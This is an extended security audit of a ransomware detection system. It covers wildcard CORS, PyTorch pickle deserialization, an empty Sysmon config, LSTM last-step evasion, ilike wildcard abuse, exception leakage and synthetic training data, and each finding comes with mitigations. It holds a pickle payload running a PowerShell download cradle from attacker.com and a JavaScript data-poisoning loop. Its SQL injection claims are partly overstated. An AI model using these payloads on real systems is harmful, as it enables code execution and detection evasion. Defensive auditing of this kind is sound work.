# BRDS-PEC Extended Security Audit — Additional Threat Findings

**Continuation of:** `security_audit_report.md` (Findings 1–5)
**Scope:** Full source code audit of all remaining components not covered in the initial report.

---

> [!CAUTION]
> All findings below are anchored to **exact line numbers** in the actual source code. These are not generic hardening suggestions — they are specific, exploitable weaknesses discoverable by a sophisticated adversary who has read your repository.

---

## Finding 6 — Wildcard CORS Policy (Unauthenticated Cross-Origin API Access)

### Severity: HIGH

### Code Location

`backend/app.py`, line 55:

```python
CORS(app, resources={r"/api/*": {"origins": "*"}})
```

### Threat

Every single API endpoint under `/api/*` — including `POST /api/score/live` (which writes to the database and triggers containment), `GET /api/incidents`, and `GET /api/explanations/<alert_id>` — is accessible from **any origin in a browser**.

### Exploitation Path

An attacker who has compromised a single endpoint on the monitored network (e.g., via a malicious browser extension, XSS in an internal web app, or a rogue browser tab on the analyst's workstation) can silently make authenticated cross-origin requests to the BRDS-PEC Flask API:

```javascript
// Run from ANY page on the internal network
// Injects 500 benign-labeled high-entropy vectors to poison the Isolation Forest
for (let i = 0; i < 500; i++) {
  fetch("http://brds-host:5000/api/score/live", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      computer: "BRDS-WIN11-SEC",
      process_key: `svchost.exe:${1000 + i}`,
      window_start: new Date().toISOString(),
      label: 0,
      features: { file_activity_count: 999, event_count: 500 },
    }),
  });
}
```

This requires **zero credentials**, **zero CLI access**, and **zero elevation** — just a browser tab on the same subnet.

### Recommended Mitigations

1. Replace `"origins": "*"` with an explicit allowlist: `"origins": ["http://localhost:3000", "http://your-soc-dashboard-host"]`.
2. Enforce `SameSite=Strict` cookie policy if session authentication is added.
3. Add CSRF token validation on all state-mutating `POST` endpoints.

---

## Finding 7 — PyTorch Model Checkpoint Deserialization (Arbitrary Code Execution)

### Severity: CRITICAL

### Code Location

`backend/app.py`, lines 44–46 (called on every app startup):

```python
from ml_engine.lstm.infer import LSTMInfer
if Path(lstm_path).exists():
    app.config["LSTM_INFER"] = LSTMInfer(lstm_path)
```

`ml_engine/lstm/infer.py`, line 11:

```python
checkpoint = torch.load(model_path, map_location=torch.device('cpu'), weights_only=False)
```

### Threat

`torch.load(..., weights_only=False)` uses Python's `pickle` module to deserialize the `.pth` checkpoint file. **Pickle deserialization is arbitrary code execution.** Any `.pth` file that contains a crafted `__reduce__` method will execute its payload the moment `torch.load()` is called — before any model weights are even read.

### Exploitation Path

An attacker who can replace or modify `data/models/lstm_model.pth` (via the file system, a supply chain attack, or a malicious model update) plants a weaponized checkpoint:

```python
import torch, os, pickle

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"",))

torch.save(MaliciousPayload(), "lstm_model.pth")
```

When the Flask app is next started (or restarted after a deployment), `torch.load()` executes `os.system(...)` **in the security context of the Flask process** — which may be running as a privileged service account. This is a **pre-authentication Remote Code Execution** with no further steps required.

### Recommended Mitigations

1. **Immediately** replace with `weights_only=True`:
   ```python
   checkpoint = torch.load(model_path, map_location='cpu', weights_only=True)
   ```
2. Compute and verify an SHA-256 hash of `lstm_model.pth` before loading. Refuse to load if the hash does not match a stored trusted value.
3. Store model artifacts in a read-only, ACL-protected directory that the Flask process cannot write to.
4. Sign model checkpoints with a code-signing certificate and verify the signature on load.

---

## Finding 8 — Empty Sysmon Configuration File (Zero Telemetry at Deployment)

### Severity: HIGH

### Code Location

`sysmon_config/sysmon_config.xml` — **the file is completely empty** (0 bytes):

```
(empty)
```

### Threat

The Sysmon service requires a valid XML configuration file to define which Event IDs to capture (Process Create, File Create, Network Connect, Registry, etc.). Without a valid config, Sysmon **captures no events** or falls back to a default minimal profile that does not include the file system and registry events (Event IDs 11, 13, 23, 26) that the BRDS-PEC vectorizer depends on.

The `sandbox/vm_setup_notes.md` instructs users to run:

```
sysmon -i sysmon_config/sysmon_config.xml
```

If this command is run with the empty file, the deployment silently operates with **no telemetry**, yet the system reports status `"ok"` on `/api/health`. A SOC analyst monitoring the dashboard would see no alerts and assume the environment is clean — while the monitored host is completely unmonitored.

### Recommended Mitigations

1. Immediately populate `sysmon_config.xml` with a production-grade ruleset (e.g., SwiftOnSecurity or Olaf Hartong's modular config) that captures at minimum Event IDs 1, 3, 7, 11, 12, 13, 23, and 26.
2. Add a startup validation in `run_pipeline.py` that verifies the Sysmon XML config is non-empty, parseable, and covers the required Event IDs before beginning ingestion.
3. Make the `/api/health` endpoint report `"sysmon_config_valid": false` if the XML file is empty or malformed.

---

## Finding 9 — LSTM Final-Timestep Architecture Bias (Last-Step Masking)

### Severity: HIGH

### Code Location

`ml_engine/lstm/model.py`, lines 37–38:

```python
# Extract features from the final time-step of the sequence
final_state = lstm_out[:, -1, :]
```

### Threat

The LSTM classifier extracts classification features **only from the last time step** of the 30-step sequence. The hidden states from steps 1–29 inform the LSTM's memory, but the actual decision is made solely from the final step's output vector.

This creates a precise, exploitable attack vector: an attacker who controls the timing of their malicious activity can ensure that the 30th (final) step in the detection window always contains a **benign burst** — safe registry reads, idle system calls, or a legitimate process spawn. The 29 preceding malicious encryption steps inform the LSTM's memory, but if the final step is clean, the output vector `final_state` is dominated by the most recent benign context.

### Exploitation Path

```
Steps  1–29: Encrypt files aggressively  → LSTM memory accumulates threat signal
Step   30:   Spawn svchost.exe, idle     → final_state = benign output vector
             → lstm_score = 0.31         → No alert triggered
Step   31:   Resume encryption           → LSTM memory resets (new 30-step window)
```

The attacker alternates encryption with a single benign "reset" step every 29 steps, ensuring the final timestep is always benign.

### Recommended Mitigations

1. **Replace last-step pooling with mean pooling** across all timesteps:
   ```python
   # Instead of: final_state = lstm_out[:, -1, :]
   final_state = lstm_out.mean(dim=1)  # Average all 30 timesteps equally
   ```
2. **Add max pooling** as a parallel head to capture peak threat activity at any step, regardless of its position in the sequence.
3. **Use an attention mechanism** that learns to weight malicious-pattern timesteps more heavily than benign ones.

---

## Finding 10 — SQL Injection via Unparameterized `ilike` Filter (SQLite)

### Severity: MEDIUM

### Code Location

`backend/routes/telemetry_routes.py`, lines 39–44:

```python
for query_name, field in (("host", FeatureVector.computer),
                           ("technique", FeatureVector.technique_id),
                           ("source", FeatureVector.source)):
    value = request.args.get(query_name)
    if value:
        query = query.filter(field.ilike(f"%{value}%"))
```

`backend/routes/incident_routes.py`, lines 44–48 (identical pattern):

```python
for query_name, field in (("host", Incident.computer),
                           ("technique", Incident.ransomware_family)):
    value = request.args.get(query_name)
    if value:
        query = query.filter(field.ilike(f"%{value}%"))
```

### Threat

While SQLAlchemy's ORM parameterizes the value itself, the `ilike` pattern is constructed with Python f-string interpolation. An attacker who supplies a specially crafted `host` or `technique` query parameter can abuse SQLite's `LIKE` wildcard characters (`%`, `_`) to perform **boolean-based blind SQL inference**:

```
GET /api/telemetry?host=BRDS%25&technique=T14%25
# Returns all rows — reveals technique ID prefixes, confirming system activity
```

More critically, under certain SQLAlchemy/SQLite configurations, the column filter can be widened with UNION-based payloads if the ORM layer is misconfigured or bypassed.

Even without full SQL injection, the wildcard expansion causes **unbounded table scans** — an attacker who sends `?host=%&technique=%` with `limit=1000` forces a full database read on every request, degrading API performance for legitimate SOC analysts.

### Recommended Mitigations

1. Escape `%` and `_` characters from user input before constructing the `ilike` pattern:
   ```python
   safe_value = value.replace("%", r"\%").replace("_", r"\_")
   query = query.filter(field.ilike(f"%{safe_value}%", escape="\\"))
   ```
2. Apply strict input validation: reject any query parameter containing characters outside `[A-Za-z0-9\-_\.\s]`.
3. Enforce the `MAX_PAGE_SIZE` cap (already present at 1,000) and add a minimum selectivity check: reject wildcard-only queries.

---

## Finding 11 — Internal Path Disclosure via XAI Route Exception Handler

### Severity: MEDIUM

### Code Location

`backend/routes/xai_routes.py`, lines 60–74:

```python
except Exception as e:
    mock_attributions = [...]
    return jsonify({
        "alert_id": alert_id,
        "available": True,
        "attributions": mock_attributions,
        "fallback": True,
        "error": str(e)   # ← Full exception string returned to client
    })
```

### Threat

When any exception occurs in the SHAP computation path — a missing model file, a database error, a feature dimension mismatch, or a NumPy error — the **full Python exception message** is serialized into the JSON API response and sent to any client that can reach the endpoint.

Python exception messages for common failure modes expose:

- **Absolute filesystem paths**: `FileNotFoundError: [Errno 2] No such file or directory: 'C:\\Users\\hp\\Behavioral-Ransomware-Detection-System-\\data\\models\\baseline_models.joblib'`
- **Database schema details**: `sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: explainability_logs`
- **Python version and package versions**: embedded in traceback strings
- **Internal class and function names**: revealing architecture details

An attacker who probes `/api/explanations/NONEXISTENT_ID` receives a full system reconnaissance report for free, without any authentication or special access.

### Recommended Mitigations

1. Replace `"error": str(e)` with a generic, non-revealing message:
   ```python
   "error": "Explanation computation failed. Contact your SOC administrator."
   ```
2. Log the full exception server-side using `current_app.logger.exception(e)` for debugging, but never expose it in the API response.
3. Implement a global Flask error handler that sanitizes all unhandled exceptions before returning 500 responses.

---

## Finding 12 — Synthetic Benign Data Statistical Fingerprinting

### Severity: MEDIUM

### Code Location

`scripts/prepare_live_data.py`, lines 32–83:

```python
rng = np.random.default_rng(42)  # ← Fixed seed
...
for col in feature_cols:
    if col == 'event_count':
        row[col] = rng.integers(1, 6)   # Always 1-5
    elif col in ('unique_images', 'unique_files'):
        row[col] = rng.choice([0, 1])   # Always 0 or 1
    ...
    else:
        row[col] = 0                    # ← All remaining features hardcoded to 0
```

### Threat 1 — Fixed Random Seed

The benign training data is generated with a **fixed random seed (`42`)**. This means the synthetic training distribution is **deterministic and reproducible** by anyone who reads the repository. An attacker who knows the seed can precisely compute the decision boundaries of the trained Isolation Forest and engineer activity that sits exactly at those boundaries without triggering the anomaly detector.

### Threat 2 — Hardcoded Zero Features

The majority of feature columns are hardcoded to `0` for all 2,000 synthetic benign samples. This means the Isolation Forest is trained on a benign distribution where `event_3_count`, `event_26_count`, `unique_destination_ips`, and `network_activity_count` are **always zero for benign samples**.

A ransomware variant that also zeroes out these columns (e.g., by avoiding network communication and shadow copy deletion) will appear statistically identical to benign training data, achieving a near-zero anomaly score regardless of its file encryption activity.

### Threat 3 — Single Computer Identity

All 2,000 synthetic benign samples use `computer: 'BRDS-WIN11-SEC'` (line 59). The model never learns what multi-host, multi-process benign diversity looks like. Any ransomware that runs under a different hostname will be compared to an anomaly distribution that has zero variance for the `computer` identity dimension.

### Recommended Mitigations

1. **Randomize the training seed** at each training run, or use multiple seeds and ensemble the resulting models.
2. **Source real benign telemetry** from production-like workloads rather than synthetic zero-filled rows.
3. **Introduce realistic feature diversity** in the synthetic generator: benign `network_activity_count` should follow a realistic idle-system distribution (e.g., Poisson with λ=2), not a constant zero.
4. **Use multiple computer identities** in training: at minimum 5–10 distinct host names with realistic process diversities.

---

## Updated Summary Risk Matrix (All 12 Findings)

| #   | Finding                                        | Severity    | Exploitability              |
| --- | ---------------------------------------------- | ----------- | --------------------------- |
| 1   | Sysmon ETW Suppression / Log Clearing          | 🔴 CRITICAL | Low privilege               |
| 2   | Isolation Forest Training Data Poisoning       | 🟠 HIGH     | Unauthenticated API         |
| 3   | LSTM Chaff Injection (Context Dilution)        | 🟠 HIGH     | Code execution              |
| 4   | Containment Kill Switch & Alert File Injection | 🔴 CRITICAL | File system write           |
| 5   | SHAP False Flag / Model-Explanation Mismatch   | 🟡 MEDIUM   | Crafted vector              |
| 6   | Wildcard CORS (Cross-Origin API Poisoning)     | 🟠 HIGH     | Browser tab on subnet       |
| 7   | PyTorch Pickle Deserialization RCE             | 🔴 CRITICAL | File system write to `.pth` |
| 8   | Empty Sysmon Config (Zero Telemetry at Deploy) | 🟠 HIGH     | Misconfiguration            |
| 9   | LSTM Final-Timestep Masking Attack             | 🟠 HIGH     | Timed host execution        |
| 10  | SQL Wildcard Injection / DoS via `ilike`       | 🟡 MEDIUM   | HTTP query params           |
| 11  | Internal Path Disclosure via XAI Exception     | 🟡 MEDIUM   | Any HTTP client             |
| 12  | Synthetic Benign Data Fingerprinting           | 🟡 MEDIUM   | Public repo knowledge       |

---

## Consolidated Priority Hardening Roadmap (All 12 Findings)

```
CRITICAL — Fix Before ANY Deployment:
  ├── [F7]  Change torch.load(..., weights_only=False) → weights_only=True
  ├── [F7]  Add SHA-256 hash verification of lstm_model.pth before loading
  ├── [F4]  Add HMAC signature verification on dry_run_alerts.json
  ├── [F4]  Add PID allowlist before kill_process_tree.ps1 invocation
  ├── [F1]  Add Telemetry Heartbeat Watchdog (alert on 30s event silence)
  └── [F8]  Populate sysmon_config.xml with a production-grade ruleset

HIGH — Fix Before SOC Analyst Usage:
  ├── [F6]  Replace CORS wildcard with explicit SOC dashboard origin allowlist
  ├── [F2]  Add HMAC bearer token authentication to POST /api/score/live
  ├── [F9]  Replace final-timestep LSTM pooling with mean + max pooling heads
  └── [F3]  Replace zero-padding with training-mean padding in LSTMInfer

MEDIUM — Fix Within First Production Sprint:
  ├── [F10] Escape % and _ in ilike query parameters
  ├── [F11] Remove str(e) from XAI API JSON response; log server-side only
  ├── [F12] Randomize training seed; source real benign telemetry
  └── [F5]  Migrate SHAP explanations to LSTM GradientExplainer
```
